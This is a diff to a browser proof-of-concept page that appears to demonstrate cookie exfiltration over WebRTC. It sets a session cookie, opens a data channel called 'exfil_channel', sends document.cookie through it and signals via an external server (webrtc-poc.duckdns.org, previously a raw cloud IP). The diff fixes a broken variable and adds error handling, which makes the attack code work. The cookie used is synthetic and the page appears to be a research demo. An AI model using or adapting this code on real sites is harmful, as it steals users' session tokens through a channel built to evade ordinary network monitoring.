@@ -21,7 +21,7 @@
 
 <script>
     // --- CONFIG ---
-    const GCE_IP = "34.38.215.82";
+    const SIGNALING_URL = "https://webrtc-poc.duckdns.org:8080/offer";
     // --------------
 
     const logDiv = document.getElementById('log');
@@ -32,11 +32,6 @@
     }
 
     async function runSequence() {
-        if (GCE_IP === "YOUR_GCE_EXTERNAL_IP") {
-            log("<span style='color:red'>ERROR: Set your GCE_IP in the script!</span>");
-            return;
-        }
-
         // 1. SET THE COOKIE (Simulating a session or tracker ID)
         const fakeToken = "SESSION_" + Math.random().toString(36).substr(2, 9);
         document.cookie = `user_auth_token=${fakeToken}; path=/; max-age=3600`;
@@ -52,12 +47,9 @@
         const dc = pc.createDataChannel("exfil_channel");
 
         dc.onopen = () => {
-            log("[SUCCESS] DataChannel Tunnel Established.");
-
-            // Read back all cookies
+            log("<span style='color:#00ff00'>[SUCCESS] DataChannel Tunnel Established.</span>");
             const payload = document.cookie;
             log(`[3] Exfiltrating Payload: ${payload}`);
-
             dc.send(payload);
         };
 
@@ -68,28 +60,35 @@
             const offer = await pc.createOffer();
             await pc.setLocalDescription(offer);
             log("[4] Gathering network candidates (ICE)...");
-        } catch (e) { log("SDP Error: " + e); }
+        } catch (e) { 
+            log("SDP Error: " + e); 
+        }
 
         pc.onicegatheringstatechange = async () => {
             if (pc.iceGatheringState === 'complete') {
-                log("[5] Signaling GCE via HTTP POST...");
+                log("[5] Signaling GCE via Secure HTTP POST...");
 
-            const response = await fetch('https://webrtc-poc.duckdns.org:8080/offer', {
-                method: 'POST',
-                body: JSON.stringify({
-                    sdp: pc.localDescription.sdp,
-                    type: pc.localDescription.type,
-                }),
-                headers: {
-                    'Content-Type': 'application/json'
-                }
-            });
+                try {
+                    const response = await fetch(SIGNALING_URL, {
+                        method: 'POST',
+                        body: JSON.stringify({
+                            sdp: pc.localDescription.sdp,
+                            type: pc.localDescription.type,
+                        }),
+                        headers: {
+                            'Content-Type': 'application/json'
+                        }
+                    });
 
-                    const answer = await res.json();
+                    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+
+                    const answer = await response.json(); // Changed from res.json()
                     log("[6] Answer received. Finalizing handshake...");
                     await pc.setRemoteDescription(new RTCSessionDescription(answer));
+                    
                 } catch (err) {
-                    log("<span style='color:orange'>Signaling failed. Check GCE Firewall/CORS.</span>");
+                    log("<span style='color:orange'>Signaling failed. Check if GCE server is running with SSL.</span>");
+                    console.error(err);
                 }
             }
         };
